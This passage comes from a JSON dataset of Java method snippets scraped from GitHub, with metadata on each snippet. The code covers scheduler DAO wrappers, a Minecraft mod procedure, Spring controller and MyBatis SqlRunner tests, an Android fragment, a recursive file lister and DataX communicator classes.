"https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31673, "method_name": "findWtssUserByName", "class_name": "JdbcExecutorLoader", "params": ["String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer findWtssUserByName(String name) throws ExecutorManagerException {\n    return this.userVariableDao.findWtssUserByName(name);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31674, "method_name": "getWtssUserTotal", "class_name": "JdbcExecutorLoader", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getWtssUserTotal() throws ExecutorManagerException {\n    return this.userVariableDao.getWtssUserTotal();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31675, "method_name": "findAllWtssUserPageList", "class_name": "JdbcExecutorLoader", "params": ["String", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<WtssUser>", "snippet": "  public List<WtssUser> findAllWtssUserPageList(String searchName, int pageNum, int pageSize) throws ExecutorManagerException {\n    return this.userVariableDao.findAllWtssUserPageList(searchName, pageNum, pageSize);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31676, "method_name": "fetchAllUserVariableByOwnerDepartment", "class_name": "JdbcExecutorLoader", "params": ["Integer"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<UserVariable>", "snippet": "  public List<UserVariable> fetchAllUserVariableByOwnerDepartment(Integer departmentId) throws ExecutorManagerException {\n\n    return this.userVariableDao.fetchAllUserVariableByOwnerDepartment(departmentId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31677, "method_name": "executeProcedure", "class_name": "PaeoniaExplosionProcedure", "params": ["java"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void executeProcedure(java.util.HashMap<String, Object> dependencies) {\n\t\tif (dependencies.get(\"x\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency x for procedure PaeoniaExplosion!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"y\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency y for procedure PaeoniaExplosion!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"z\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency z for procedure PaeoniaExplosion!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"world\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency world for procedure PaeoniaExplosion!\");\n\t\t\treturn;\n\t\t}\n\t\tint x = (int) dependencies.get(\"x\");\n\t\tint y = (int) dependencies.get(\"y\");\n\t\tint z = (int) dependencies.get(\"z\");\n\t\tWorld world = (World) dependencies.get(\"world\");\n\t\tif (!world.isRemote) {\n\t\t\tItemEntity entityToSpawn = new ItemEntity(world, x, y, z, new ItemStack(PaeoniaBlock.block, (int) (1)));\n\t\t\tentityToSpawn.setPickupDelay(10);\n\t\t\tworld.addEntity(entityToSpawn);\n\t\t}\n\t\tif (!world.isRemote) {\n\t\t\tItemEntity entityToSpawn = new ItemEntity(world, x, y, z, new ItemStack(Items.FLOWER_POT, (int) (1)));\n\t\t\tentityToSpawn.setPickupDelay(10);\n\t\t\tworld.addEntity(entityToSpawn);\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/procedures/PaeoniaExplosionProcedure.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 31678, "method_name": "accueil_devrait_retourner_la_page_d_accueil_de_l_application_quand_le_cookie_code_postal_n_est_pas_present", "class_name": "SaisieIdentiteRemettantControllerTest", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "    void accueil_devrait_retourner_la_page_d_accueil_de_l_application_quand_le_cookie_code_postal_n_est_pas_present() throws Exception {\n        // Given\n        Cookie cookieTypeRemettant = new Cookie(NOM_COOKIE_TYPE_REMETTANT, TYPE_REMETTANT);\n\n        // When Then\n        mockMvc.perform(MockMvcRequestBuilders.get(\"/\")\n                .cookie(cookieTypeRemettant))\n                .andExpect(view().name(\"accueil\"))\n                .andExpect(status().isOk())\n                .andExpect(content().string(containsString(\"\u00c9tapes \u00e0 suivre afin de transmettre les masques\")));\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/application/ui/SaisieIdentiteRemettantControllerTest.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31679, "method_name": "accueil_devrait_retourner_la_page_d_accueil_de_l_application_quand_le_cookie_type_remettant_n_est_pas_present", "class_name": "SaisieIdentiteRemettantControllerTest", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "    void accueil_devrait_retourner_la_page_d_accueil_de_l_application_quand_le_cookie_type_remettant_n_est_pas_present() throws Exception {\n        // Given\n        Cookie cookieCodePostal = new Cookie(NOM_COOKIE_CODE_POSTAL_REMETTANT, CODE_POSTAL);\n\n        // When Then\n        mockMvc.perform(MockMvcRequestBuilders.get(\"/\")\n                .cookie(cookieCodePostal))\n                .andExpect(view().name(\"accueil\"))\n                .andExpect(status().isOk())\n                .andExpect(content().string(containsString(\"\u00c9tapes \u00e0 suivre afin de transmettre les masques\")));\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/application/ui/SaisieIdentiteRemettantControllerTest.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31680, "method_name": "accueil_devrait_rediriger_vers_la_page_de_saisie_d_identite_quand_les_cookies_sont_presents", "class_name": "SaisieIdentiteRemettantControllerTest", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "    void accueil_devrait_rediriger_vers_la_page_de_saisie_d_identite_quand_les_cookies_sont_presents() throws Exception {\n        // Given\n        Cookie cookieCodePostal = new Cookie(NOM_COOKIE_CODE_POSTAL_REMETTANT, CODE_POSTAL);\n        Cookie cookieTypeRemettant = new Cookie(NOM_COOKIE_TYPE_REMETTANT, TYPE_REMETTANT);\n\n        // When Then\n        mockMvc.perform(MockMvcRequestBuilders.get(\"/\")\n                .cookie(cookieCodePostal, cookieTypeRemettant))\n                .andExpect(view().name(\"redirect:/saisie-identite-demandeur\"))\n                .andExpect(status().is3xxRedirection());\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/application/ui/SaisieIdentiteRemettantControllerTest.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31681, "method_name": "onCreateView", "class_name": "GalleryFragment", "params": ["LayoutInflater", "ViewGroup", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View onCreateView(@NonNull LayoutInflater inflater,\n                             ViewGroup container, Bundle savedInstanceState) {\n        galleryViewModel =\n                ViewModelProviders.of(this).get(GalleryViewModel.class);\n        View root = inflater.inflate(R.layout.fragment_gallery, container, false);\n        final TextView textView = root.findViewById(R.id.text_gallery);\n        galleryViewModel.getText().observe(getViewLifecycleOwner(), new Observer<String>() {\n            @Override\n            public void onChanged(@Nullable String s) {\n                textView.setText(s);\n            }\n        });\n        return root;\n    }", "url": "https://raw.githubusercontent.com/dahilu/BeautyOverview/master/app/src/main/java/com/example/beautyoverview/ui/gallery/GalleryFragment.java", "stars": "1", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 31682, "method_name": "main", "class_name": "Demo05Recurison", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        File file = new File(\"c:\\\\abc\");\n        getAllFile(file);\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/19.%E3%80%90File%E7%B1%BB%E3%80%81%E9%80%92%E5%BD%92%E3%80%91-%E7%AC%94%E8%AE%B0/code/08_FileAndRecursion/src/com/itheima/demo02/Recursion/Demo05Recurison.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31683, "method_name": "getAllFile", "class_name": "Demo05Recurison", "params": ["File"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void getAllFile(File dir){\n        //System.out.println(dir);//\u6253\u5370\u88ab\u904d\u5386\u7684\u76ee\u5f55\u540d\u79f0\n        File[] files = dir.listFiles();\n        for (File f : files) {\n            //\u5bf9\u904d\u5386\u5f97\u5230\u7684File\u5bf9\u8c61f\u8fdb\u884c\u5224\u65ad,\u5224\u65ad\u662f\u5426\u662f\u6587\u4ef6\u5939\n            if(f.isDirectory()){\n                //f\u662f\u4e00\u4e2a\u6587\u4ef6\u5939,\u5219\u7ee7\u7eed\u904d\u5386\u8fd9\u4e2a\u6587\u4ef6\u5939\n                //\u6211\u4eec\u53d1\u73b0getAllFile\u65b9\u6cd5\u5c31\u662f\u4f20\u9012\u6587\u4ef6\u5939,\u904d\u5386\u6587\u4ef6\u5939\u7684\u65b9\u6cd5\n                //\u6240\u4ee5\u76f4\u63a5\u8c03\u7528getAllFile\u65b9\u6cd5\u5373\u53ef:\u9012\u5f52(\u81ea\u5df1\u8c03\u7528\u81ea\u5df1)\n                getAllFile(f);\n            }else{\n                //f\u662f\u4e00\u4e2a\u6587\u4ef6,\u76f4\u63a5\u6253\u5370\u5373\u53ef\n                /*\n                    c:\\\\abc\\\\abc.java\n                    \u53ea\u8981.java\u7ed3\u5c3e\u7684\u6587\u4ef6\n                    1.\u628aFile\u5bf9\u8c61f,\u8f6c\u4e3a\u5b57\u7b26\u4e32\u5bf9\u8c61\n                 */\n                //String name = f.getName();//abc.java\n                //String path = f.getPath();//c:\\\\abc\\\\abc.java\n                //String s = f.toString();//c:\\\\abc\\\\abc.java\n\n                //\u628a\u5b57\u7b26\u4e32,\u8f6c\u6362\u4e3a\u5c0f\u5199\n                //s = s.toLowerCase();\n\n                //2.\u8c03\u7528String\u7c7b\u4e2d\u7684\u65b9\u6cd5endsWith\u5224\u65ad\u5b57\u7b26\u4e32\u662f\u5426\u662f\u4ee5.java\u7ed3\u5c3e\n                //boolean b = s.endsWith(\".java\");\n\n                //3.\u5982\u679c\u662f\u4ee5.java\u7ed3\u5c3e\u7684\u6587\u4ef6,\u5219\u8f93\u51fa\n                /*if(b){\n                    System.out.println(f);\n                }*/\n\n                if(f.getName().toLowerCase().endsWith(\".java\")){\n                    System.out.println(f);\n                }\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/19.%E3%80%90File%E7%B1%BB%E3%80%81%E9%80%92%E5%BD%92%E3%80%91-%E7%AC%94%E8%AE%B0/code/08_FileAndRecursion/src/com/itheima/demo02/Recursion/Demo05Recurison.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31684, "method_name": "getConfiguration", "class_name": "AbstractContainerCommunicator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Configuration", "snippet": "    public Configuration getConfiguration() {\n        return this.configuration;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/communicator/AbstractContainerCommunicator.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31685, "method_name": "getCollector", "class_name": "AbstractContainerCommunicator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "AbstractCollector", "snippet": "    public AbstractCollector getCollector() {\n        return collector;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/communicator/AbstractContainerCommunicator.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31686, "method_name": "getReporter", "class_name": "AbstractContainerCommunicator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "AbstractReporter", "snippet": "    public AbstractReporter getReporter() {\n        return reporter;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/communicator/AbstractContainerCommunicator.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31687, "method_name": "setCollector", "class_name": "AbstractContainerCommunicator", "params": ["AbstractCollector"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCollector(AbstractCollector collector) {\n        this.collector = collector;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/communicator/AbstractContainerCommunicator.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31688, "method_name": "setReporter", "class_name": "AbstractContainerCommunicator", "params": ["AbstractReporter"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setReporter(AbstractReporter reporter) {\n        this.reporter = reporter;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/communicator/AbstractContainerCommunicator.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31689, "method_name": "getJobId", "class_name": "AbstractContainerCommunicator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getJobId() {\n        return jobId;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/communicator/AbstractContainerCommunicator.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31690, "method_name": "registerCommunication", "class_name": "AbstractContainerCommunicator", "params": ["List<Configuration>"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void registerCommunication(List<Configuration> configurationList);\n\n    public abstract Communication collect();\n\n    public abstract void report(Communication communication);\n\n    public abstract State collectState();\n\n    public abstract Communication getCommunication(Integer id);\n\n    /**\n     * \u5f53 \u5b9e\u73b0\u662f TGContainerCommunicator \u65f6\uff0c\u8fd4\u56de\u7684 Map: key=taskId, value=Communication\n     * \u5f53 \u5b9e\u73b0\u662f JobContainerCommunicator \u65f6\uff0c\u8fd4\u56de\u7684 Map: key=taskGroupId, value=Communication\n     */\n    public abstract Map<Integer, Communication> getCommunicationMap();\n\n    public void resetCommunication(Integer id) {\n        Map<Integer, Communication> map = getCommunicationMap();\n        map.put(id, new Communication());\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/communicator/AbstractContainerCommunicator.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31691, "method_name": "collect", "class_name": "AbstractContainerCommunicator", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "Communication", "snippet": "    public abstract Communication collect();\n\n    public abstract void report(Communication communication);\n\n    public abstract State collectState();\n\n    public abstract Communication getCommunication(Integer id);\n\n    /**\n     * \u5f53 \u5b9e\u73b0\u662f TGContainerCommunicator \u65f6\uff0c\u8fd4\u56de\u7684 Map: key=taskId, value=Communication\n     * \u5f53 \u5b9e\u73b0\u662f JobContainerCommunicator \u65f6\uff0c\u8fd4\u56de\u7684 Map: key=taskGroupId, value=Communication\n     */\n    public abstract Map<Integer, Communication> getCommunicationMap();\n\n    public void resetCommunication(Integer id) {\n        Map<Integer, Communication> map = getCommunicationMap();\n        map.put(id, new Communication());\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/communicator/AbstractContainerCommunicator.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31692, "method_name": "report", "class_name": "AbstractContainerCommunicator", "params": ["Communication"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void report(Communication communication);\n\n    public abstract State collectState();\n\n    public abstract Communication getCommunication(Integer id);\n\n    /**\n     * \u5f53 \u5b9e\u73b0\u662f TGContainerCommunicator \u65f6\uff0c\u8fd4\u56de\u7684 Map: key=taskId, value=Communication\n     * \u5f53 \u5b9e\u73b0\u662f JobContainerCommunicator \u65f6\uff0c\u8fd4\u56de\u7684 Map: key=taskGroupId, value=Communication\n     */\n    public abstract Map<Integer, Communication> getCommunicationMap();\n\n    public void resetCommunication(Integer id) {\n        Map<Integer, Communication> map = getCommunicationMap();\n        map.put(id, new Communication());\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/communicator/AbstractContainerCommunicator.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31693, "method_name": "collectState", "class_name": "AbstractContainerCommunicator", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "State", "snippet": "    public abstract State collectState();\n\n    public abstract Communication getCommunication(Integer id);\n\n    /**\n     * \u5f53 \u5b9e\u73b0\u662f TGContainerCommunicator \u65f6\uff0c\u8fd4\u56de\u7684 Map: key=taskId, value=Communication\n     * \u5f53 \u5b9e\u73b0\u662f JobContainerCommunicator \u65f6\uff0c\u8fd4\u56de\u7684 Map: key=taskGroupId, value=Communication\n     */\n    public abstract Map<Integer, Communication> getCommunicationMap();\n\n    public void resetCommunication(Integer id) {\n        Map<Integer, Communication> map = getCommunicationMap();\n        map.put(id, new Communication());\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/communicator/AbstractContainerCommunicator.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31694, "method_name": "getCommunication", "class_name": "AbstractContainerCommunicator", "params": ["Integer"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "Communication", "snippet": "    public abstract Communication getCommunication(Integer id);\n\n    /**\n     * \u5f53 \u5b9e\u73b0\u662f TGContainerCommunicator \u65f6\uff0c\u8fd4\u56de\u7684 Map: key=taskId, value=Communication\n     * \u5f53 \u5b9e\u73b0\u662f JobContainerCommunicator \u65f6\uff0c\u8fd4\u56de\u7684 Map: key=taskGroupId, value=Communication\n     */\n    public abstract Map<Integer, Communication> getCommunicationMap();\n\n    public void resetCommunication(Integer id) {\n        Map<Integer, Communication> map = getCommunicationMap();\n        map.put(id, new Communication());\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/communicator/AbstractContainerCommunicator.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31695, "method_name": "getCommunicationMap", "class_name": "AbstractContainerCommunicator", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "Map<Integer,Communication>", "snippet": "    public abstract Map<Integer, Communication> getCommunicationMap();\n\n    public void resetCommunication(Integer id) {\n        Map<Integer, Communication> map = getCommunicationMap();\n        map.put(id, new Communication());\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/communicator/AbstractContainerCommunicator.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31696, "method_name": "resetCommunication", "class_name": "AbstractContainerCommunicator", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void resetCommunication(Integer id) {\n        Map<Integer, Communication> map = getCommunicationMap();\n        map.put(id, new Communication());\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/communicator/AbstractContainerCommunicator.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31697, "method_name": "reportVmInfo", "class_name": "AbstractContainerCommunicator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void reportVmInfo() {\n        long now = System.currentTimeMillis();\n        //\u6bcf5\u5206\u949f\u6253\u5370\u4e00\u6b21\n        if (now - lastReportTime >= 300000) {\n            //\u5f53\u524d\u4ec5\u6253\u5370\n            if (vmInfo != null) {\n                vmInfo.getDelta(true);\n            }\n            lastReportTime = now;\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/communicator/AbstractContainerCommunicator.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 31698, "method_name": "postHandle", "class_name": "CookieInterceptor", "params": ["HttpServletRequest", "HttpServletResponse", "Object", "ModelAndView"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler,\n\t\t\tModelAndView modelAndView) throws Exception {\n\n\t\t// cookie\n\t\tif (modelAndView!=null && request.getCookies()!=null && request.getCookies().length>0) {\n\t\t\tHashMap<String, Cookie> cookieMap = new HashMap<String, Cookie>();\n\t\t\tfor (Cookie ck : request.getCookies()) {\n\t\t\t\tcookieMap.put(ck.getName(), ck);\n\t\t\t}\n\t\t\tmodelAndView.addObject(\"cookieMap\", cookieMap);\n\t\t}\n\n\t\t// static method\n\t\tif (modelAndView != null) {\n\t\t\tmodelAndView.addObject(\"I18nUtil\", FtlUtil.generateStaticModel(I18nUtil.class.getName()));\n\t\t}\n\t\t\n\t\tsuper.postHandle(request, response, handler, modelAndView);\n\t}", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/main/java/com/avon/rga/controller/interceptor/CookieInterceptor.java", "stars": "1", "class_props": {"extends": "HandlerInterceptorAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 31699, "method_name": "shouldSelectOne", "class_name": "SqlRunnerTest", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldSelectOne() throws Exception {\n    DataSource ds = createUnpooledDataSource(JPETSTORE_PROPERTIES);\n    runScript(ds, JPETSTORE_DDL);\n    runScript(ds, JPETSTORE_DATA);\n    try (Connection connection = ds.getConnection()) {\n      SqlRunner exec = new SqlRunner(connection);\n      Map<String, Object> row = exec.selectOne(\"SELECT * FROM PRODUCT WHERE PRODUCTID = ?\", \"FI-SW-01\");\n      assertEquals(\"FI-SW-01\", row.get(\"PRODUCTID\"));\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/jdbc/SqlRunnerTest.java", "stars": "15", "class_props": {"extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"id": 31700, "method_name": "shouldSelectList", "class_name": "SqlRunnerTest", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldSelectList() throws Exception {\n    DataSource ds = createUnpooledDataSource(JPETSTORE_PROPERTIES);\n    runScript(ds, JPETSTORE_DDL);\n    runScript(ds, JPETSTORE_DATA);\n    try (Connection connection = ds.getConnection()) {\n      SqlRunner exec = new SqlRunner(connection);\n      List<Map<String, Object>> rows = exec.selectAll(\"SELECT * FROM PRODUCT\");\n      assertEquals(16, rows.size());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/jdbc/SqlRunnerTest.java", "stars": "15", "class_props": {"extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"id": 31701, "method_name": "shouldInsert", "class_name": "SqlRunnerTest", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldInsert() throws Exception {\n    DataSource ds = createUnpooledDataSource(BLOG_PROPERTIES);\n    runScript(ds, BLOG_DDL);\n    try (Connection connection = ds.getConnection()) {\n      SqlRunner exec = new SqlRunner(connection);\n      exec.setUseGeneratedKeySupport(true);\n      int id = exec.insert(\"INSERT INTO author (username, password, email, bio) VALUES (?,?,?,?)\", \"someone\", \"******\", \"someone@apache.org\", Null.LONGVARCHAR);\n      Map<String, Object> row = exec.selectOne(\"SELECT * FROM author WHERE username = ?\", \"someone\");\n      connection.rollback();\n      assertTrue(SqlRunner.NO_GENERATED_KEY != id);\n      assertEquals(\"someone\", row.get(\"USERNAME\"));\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/jdbc/SqlRunnerTest.java", "stars": "15", "class_props": {"extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"id": 31702, "method_name": "shouldUpdateCategory", "class_name": "SqlRunnerTest", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldUpdateCategory() throws Exception {\n    DataSource ds = createUnpooledDataSource(JPETSTORE_PROPERTIES);\n    runScript(ds, JPETSTORE_DDL);\n    runScript(ds, JPETSTORE_DATA);\n    try (Connection connection = ds.getConnection()) {\n      SqlRunner exec = new SqlRunner(connection);\n      int count = exec.update(\"update product set category = ? where productid = ?\", \"DOGS\", \"FI-SW-01\");\n      Map<String, Object> row = exec.selectOne(\"SELECT * FROM PRODUCT WHERE PRODUCTID = ?\", \"FI-SW-01\");\n      assertEquals(\"DOGS\", row.get(\"CATEGORY\"));\n      assertEquals(1, count);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/jdbc/SqlRunnerTest.java", "stars": "15", "class_props": {"extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"id": 31703, "method_name": "shouldDeleteOne", "class_name": "SqlRunnerTest", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldDeleteOne() throws Exception {\n    DataSource ds = createUnpooledDataSource(JPETSTORE_PROPERTIES);\n    runScript(ds, JPETSTORE_DDL);\n    runScript(ds, JPETSTORE_DATA);\n    try (Connection connection = ds.getConnection()) {\n      SqlRunner exec = new SqlRunner(connection);\n      int count = exec.delete(\"delete from item\");\n      List<Map<String, Object>> rows = exec.selectAll(\"SELECT * FROM ITEM\");\n      assertEquals(28, count);\n      assertEquals(0, rows.size());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/jdbc/SqlRunnerTest.java", "stars": "15", "class_props": {"extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"id": 31704, "method_name": "shouldDemonstrateDDLThroughRunMethod", "class_name": "SqlRunnerTest", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldDemonstrateDDLThroughRunMethod() throws Exception {\n    DataSource ds = createUnpooledDataSource(JPETSTORE_PROPERTIES);\n    try (Connection connection = ds.getConnection()) {\n      SqlRunner exec = new SqlRunner(connection);\n      exec.run(\"CREATE TABLE BLAH(ID INTEGER)\");\n      exec.run(\"insert into BLAH values (1)\");\n      List<Map<String, Object>> rows = exec.selectAll(\"SELECT * FROM BLAH\");\n      exec.run(\"DROP TABLE BLAH\");\n      assertEquals(1, rows.size());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/jdbc/SqlRunnerTest.java", "stars": "15", "class_props": {"extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"id": 31705, "method_name": "setRecordSender", "class_name": "ReaderRunner", "params": ["RecordSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRecordSender(RecordSender recordSender) {\n        this.recordSender = recordSender;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/taskgroup/runner/ReaderRunner.java", "stars": "23", "class_props": {"extends": "AbstractRunner", "implements": ["Runnable"], "modifiers": ["public"]}}, {"id": 31706, "method_name": "setChannelOutput", "class_name": "ReaderRunner", "params": ["ChannelOutput"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setChannelOutput(ChannelOutput channelOutput){\n        this.channelOutput = channelOutput;\n    }", 